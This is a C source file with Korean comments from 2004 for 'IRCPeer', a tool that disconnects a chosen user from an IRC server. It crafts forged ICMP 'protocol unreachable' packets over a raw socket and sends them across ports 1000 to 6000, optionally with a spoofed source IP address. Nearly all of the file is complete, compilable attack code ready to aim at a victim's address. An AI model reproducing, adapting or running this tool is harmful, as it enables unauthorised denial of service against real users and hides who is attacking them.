/*
* File Name: IRCPeer.c
*
* File Description:
*  IRC 서버에 연결되어 있는 client 로 변조된 ICMP packet 을 보내어
*  해당 client 의 연결을 끊게 한다.
* 
*                     <? $eMail = "indra"."\x40"."linux.co.kr"; ?>
*
*                                    http://indra.linuxstudy.pe.kr
*/
/*
* A fundamental principle:
*
*  ICMP 는 Internet Control Message Protocol 의 준말이며,
* 네트워크 통신중의 에러, 혹은 다른 상태에 관한 정보를 알려주기 위한
* 프로토콜 이다.
* 
*  ICMP 는 IP layer 이며, 이로 인해 ICMP 정보는 IP packet 안에 삽입되어 진다.
* 이를 인캡슐레이션(encapsulation) 이라 한다.
* 이러한 ICMP Message 에는 에러의 타입을 알리는 type field 와
* 좀 더 자세한 에러를 알리기 위한 code field 가 존재한다.
* Stevens 의 TCP-IP Illustrated Vol-1 의 p71 에는 해당 type 과
* code 에 대한 목록이 있다.
* 그 목록을 보면 type 3 은 'destination unreachable' 이라고 하여,
* 목적지에 도달할수 없다는 의미의 에러와, 그에 상응하는 
* code field 들이 나열되어 있다.
* 
*  code field 를 보면 'protocol unreachable' 의 코드가 2 로 정해져 있다.
* 이 부분을 사용하는것이 본 코드의 core 부분이라 말할 수 있다.
* 좀 더 자세하게 이야기 하면, 해당 ICMP message 를 client 에게
* 전달하여 어플리케이션으로 하여금 에러를 발생시키는것이다.
* 
*  raw socket 으로 만들어 내는 패킷은 p78 하단에 나와있는 
* figure 6.9 와 비슷한데, 책에서는 udp 를 사용하는 tftp 의 
* 'UDP port unreachable' 의 ICMP packet 을 예제로 설명한것이고, 
* 본 코드는 'TCP protocol unreachable' 을 구현한것이다.
* 즉, IRC 는 UDP 가 아닌 TCP 이므로 마지막의 UDP header 부분의 
* 8 바이트를 TCP header 8 바이트로 변환하고, error type 과 code 를 변경하였다.
* 본 코드에서 만들어 내는 packet 구조는 다음과 같다.
* 
*            |◀━━━━━━━━━ IP datagram ━━━━━━━━━━▶|
*                           |◀━━━━━━ ICMP message ━━━━━▶|
*                                 |◀ data portion of ICMP message ▶|
* /━━━━━+━━━━━━━+━━━+━━━━━━━━━━━━+━━━━/
* |          |              |      |                        |        |
* | Ethernet |      IP      | ICMP | IP header of datagram  |   TCP  | 
* |          |              |      | that generated error   | header |
* /━━━━━+━━━━━━━+━━━+━━━━━━━━━━━━+━━━━/
*     14            20         8              20                 8
*    bytes         bytes     bytes           bytes             bytes 
*
*  본 코드에서는 IP 부분부터 구현하였는데 PKTSIZE 가 define 된 부분부터 보면,
*
* [ struct ip ] + [ struct icmp ] + [ 8 bytes of struct tcphdr ]
*
* 이러한 형식으로 구성되었다.
* 중간의 IP header 20바이트 부분은 icmp 구조체 안의 icmp_data 멤버의 
* 20바이트에 할당하여 사용한다.
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <net/if.h>

#define S_PORT      1000        // 공격 시작 포트
#define E_PORT      6000        // 공격 끝 포트
#define PKTSIZE     (sizeof(struct ip) + sizeof(struct icmp) + 8)

#ifndef IPVERSION
# define IPVERSION  4
#endif

#ifdef  __FreeBSD__
    char *_if_name[] = { "ed0", "ed1", NULL };
# else
#  ifdef __linux__
    char *_if_name[] = { "eth0", "eth1", NULL };
#  endif
#endif

/* define structure */
struct info {
    char t_addr[16];
    int  t_port;
    char irc_addr[16];
    int  irc_port;
    char spoof_addr[16];
};

/* user-defined function prototype */
void            usage(char *);
void            Attack(struct info *);
unsigned short  in_cksum(unsigned short *, int);
char            *get_local_ip(void);

int main(int argc, char **argv)
{
    int             opt,
                    irc_port = 6667;    // 기본 IRC 접속 포트
    int             i, spoof = -1;
    unsigned int    addr;
    struct hostent  *he;
    struct info     *info;              // 공격 정보를 담을 구조체
    char            *t_addr = NULL,     // 공격 타겟 IP address
                    *irc_serv = NULL,   // IRC Server domain
                    *spoof_addr = NULL, // Spoofing 하게 될 IP
                    irc_addr[16];       // IRC Server IP address

    while((opt = getopt(argc, argv, "t:i:p:s:")) != -1) {
        switch(opt) {
            case 't':
                t_addr = optarg;
                break;
            case 'i':
                irc_serv = optarg;
                break;
            case 'p':
                irc_port = atoi(optarg);
                break;
            case 's':
                if((spoof_addr = malloc(strlen(optarg)+1)) == NULL) {
                    fprintf(stderr, "[-] Out of memory\n");
                    exit(-1);
                }
		memset(spoof_addr, 0, strlen(optarg)+1);
		snprintf(spoof_addr, strlen(optarg), "%s", optarg);
                spoof = 1;
                break;
            default:
                usage(argv[0]);
        }
    }

    /* 타겟 아이피나 IRC 서버의 주소정보가 없을 경우 에러처리 */
    if(t_addr == NULL || irc_serv == NULL) {
        usage(argv[0]);
    }

    if((he = gethostbyname(irc_serv)) == NULL) {
        fprintf(stderr, "%s - ", irc_serv);
        herror("gethostbyname");
        exit(-1);
    }

    memcpy(&addr, he->h_addr, 4);
    memset(irc_addr, 0, sizeof(irc_addr));
    snprintf(irc_addr, sizeof(irc_addr), "%s", inet_ntoa(addr));

    fprintf(stdout, "IRCPeer - A tool for IRC ICMP flood.\n\n");

    fprintf(stdout, "[+] Check uid: ");
    
    if(getuid()) {
	fprintf(stdout, 
                "failed.\n"
                "! You are not root.\n"
        );
	exit(-1);
    }
    else {
        fprintf(stdout, "ok.\n");
    }

    fprintf(stdout, 
            "[+] Target IP Address: %s\n"
            "[+] Server: %s (%s)\n"
            "[+] Server Port: %d\n",
            t_addr, irc_serv, irc_addr, irc_port);
    
    /* 스푸핑 옵션 On 
    *
    * 어떤 네트워크는 라우팅 단에서 스푸핑 된 packet 을 끊어먹는 경우가 있음.
    * 그럴 경우 스푸핑 된 packet 은 해당 경로에 도달하지 못함.
    */
    if(spoof == 1) {
        fprintf(stdout, "[+] Spoof IP: %s\n", spoof_addr);
    }
    else {
        if((spoof_addr = get_local_ip()) == NULL) {
            fprintf(stderr, 
                    "[-] Error! - Couldn't get local IP address.\n"
                    "\tUse the `-s' option: -s IP_ADDRESS_OF_THIS_MACHINE\n"
            );
            exit(-1);
        }
	
        fprintf(stdout, "[!] No Spoof (%s)\n", spoof_addr);
    }
           
    info = (struct info *)malloc(sizeof(struct info));
    if(info == NULL) {
        fprintf(stderr, "[-] Out of memory.\n");
        exit(-1);
    }
    
    strncpy(info->t_addr, t_addr, sizeof(info->t_addr));
    info->t_port = 0;
    strncpy(info->irc_addr, irc_addr, sizeof(info->irc_addr));
    info->irc_port = irc_port;
    strncpy(info->spoof_addr, spoof_addr, sizeof(info->spoof_addr));
    
    free(spoof_addr);
    
    for(i = S_PORT; i < E_PORT; i++) {
        if(i%30 == 0) usleep(200000);   // delay 0.2 seconds
        info->t_port = i;
        Attack(info);
        fprintf(stdout, "[-] Sending Packets..... %d\n", i);
        fprintf(stdout, "\033[J\033[A");
    }
    fprintf(stdout, "[+] Sending Packets..... %d\n", i);
    fprintf(stdout, "[+] Complete.\n");
    
    free(info);
    return 0;
}

/*
* Function Name: usage
*
* Function Description:
*  공격에 사용될 기본 정보가 입력되지 않았을때 실행되며,
*  본 프로그램에 대한 사용법을 출력한다.
*/
void usage(char *prog)
{
    fprintf(stdout, 
            "IRCPeer - A tool for IRC ICMP flood.\n\n"
            "Usage: %s -t <TARGET> -i <IRC SERVER> "
            "[-p <IRC PORT> -s <SPOOF IP>]\n\n"
            "  -t <TARGET> \t\tTarget IP Address.\n"
            "  -i <IRC SERVER> \tIRC Server.\n"
            "  -p <IRC PORT> \tIRC Port.\n"
            "  -s <SPOOF IP> \tSpoofing Mode.\n\n"
            "<IRC PORT>:\n"
            "\tDefault = 6667\n", prog);

    exit(0);
}

/*
* Function Name: Attack
*
* Function Description:
*  실제적인 공격에 관한 사용자 정의 함수이다.
*  함수의 매개변수로는 Client IP/Port, Server IP/Port.
*  Spoofing IP 이렇게 다섯가지 정보가 저장되어 있는
*  구조체의 포인터가 사용된다.
*  만일 Spoofing Option 이 사용되지 않는 경우, Spoofing IP 정보는
*  로컬 서버 IP 로 사용된다.
*/
void Attack(struct info *info)
{
    int                 on = 1,
                        sock;
    char                pkt[PKTSIZE];
    struct icmp         *icmp;
    struct ip           *ip, *iphdr;
    struct tcphdr       *tcphdr;
    struct sockaddr_in  addr;

    memset(pkt, 0, PKTSIZE);

    if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket");
        exit(-1);
    }

    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&on, sizeof(on)) < 0) {
        perror("setsockopt");
        exit(-1);
    }

    /* IP Configuration */
    ip = (struct ip *)pkt;

    ip->ip_hl = 5;
    ip->ip_v = IPVERSION;
    ip->ip_len = htons(sizeof(struct ip) + sizeof(struct icmp));
    ip->ip_id =htons(getpid());
    ip->ip_ttl = 242;
    ip->ip_p = IPPROTO_ICMP;
    ip->ip_src.s_addr = inet_addr(info->spoof_addr);
    ip->ip_dst.s_addr = inet_addr(info->t_addr);
    ip->ip_sum = htons((unsigned short)in_cksum((unsigned short *)ip, \
                    sizeof(struct ip)));

    /* ICMP Configuration */
    icmp = (struct icmp *)(pkt + sizeof(struct ip));

    icmp->icmp_type = ICMP_UNREACH;
    icmp->icmp_code = ICMP_UNREACH_PROTOCOL;

    /* IP header Configuration */
    iphdr = (struct ip *)icmp->icmp_data;
    
    iphdr->ip_hl = 5;
    iphdr->ip_v = IPVERSION;
    iphdr->ip_len = 4;
    iphdr->ip_id = getpid();
    iphdr->ip_ttl = 131;
    iphdr->ip_p = IPPROTO_TCP;
    iphdr->ip_src.s_addr = ip->ip_dst.s_addr;
    iphdr->ip_dst.s_addr = inet_addr(info->irc_addr);
                                
    /* Uppon Layer Protocol 8bytes */
    tcphdr = (struct tcphdr *)(pkt + sizeof(struct ip) + sizeof(struct icmp));

#if defined(__linux__)
    tcphdr->source = htons(info->t_port);
    tcphdr->dest = htons(info->irc_port);
    tcphdr->seq = rand()%time(NULL);
#else
    tcphdr->th_sport = htons(info->t_port);
    tcphdr->th_dport = htons(info->irc_port);
    tcphdr->th_seq = rand()%time(NULL);
#endif

    /* ICMP checksum */
    icmp->icmp_cksum = in_cksum((unsigned short *)icmp, +
                            sizeof(struct icmp) + 8);

    memset((char*)&addr, 0, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(info->t_addr);

    sendto(sock, (char*)pkt, sizeof(pkt), 0, (struct sockaddr *)&addr, \
        sizeof(addr));
    close(sock);
}

/*
 * Function Name: get_local_ip
 *
 * Function Description:
 *  현재 로컬 아이피를 구해 반환한다.
 */
char *get_local_ip(void)
{
    int                 s, i = 0;
    char                *buf = NULL;
    struct  ifreq       ifr;
    struct  sockaddr_in *in_addr;

    memset(&ifr, 0, sizeof(ifr));

    if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        perror("socket");
        return NULL;
    }

    in_addr = (struct sockaddr_in *)&ifr.ifr_addr;
    in_addr->sin_family = AF_INET;

    for(i = 0; i < 2; i++) {
        strcpy(ifr.ifr_name, _if_name[i]);
        if(ioctl(s, SIOCGIFADDR, &ifr) == 0) {
            if((buf = malloc(16)) == NULL) {
                fprintf(stderr, "[-] Out of memory\n");
                return NULL;
            }
            snprintf(buf, 16, "%s", inet_ntoa(in_addr->sin_addr));
            break;
        }
    }
    return (char*)buf;
}

/*
* Function Name: in_cksum
*
* Function Description:
*  체크섬 함수이며, Stevens - Unix Network Programming Vol-1 p672 에 
*  나와있는 코드를 그대로 가져다 사용하였다.
*/
unsigned short in_cksum(unsigned short *addr,int len)
{
    register int sum = 0;
    u_short answer = 0;
    register u_short *w = addr;
    register int nleft = len;

    /*
    * Our algorithm is simple, using a 32 bit accumulator (sum), we add
    * sequential 16 bit words to it, and at the end, fold back all the
    * carry bits from the top 16 bits into the lower 16 bits.
    */
    while(nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if(nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
    sum += (sum >> 16);                     /* add carry */
    answer = ~sum;                          /* truncate to 16 bits */
    return(answer);
}
/*
* 2004. 2. 24.
*
* LUG 병희님께서 FreeBSD 서버 계정을 지원해주신 덕분에 FreeBSD 에서
* 컴파일 테스트 완료.
* (단, FreeBSD root 계정이 없어서 테스트를 못했으므로 ICMP packet 이 제대로 도착할지는 모름--;)
*
* 2004. 3. 14.
*
* 로컬 아이피를 반환하는 UDF 를 get_local_ip() 함수로 수정.
* FreeBSD 와 Linux 에서 테스트 완료.
*/
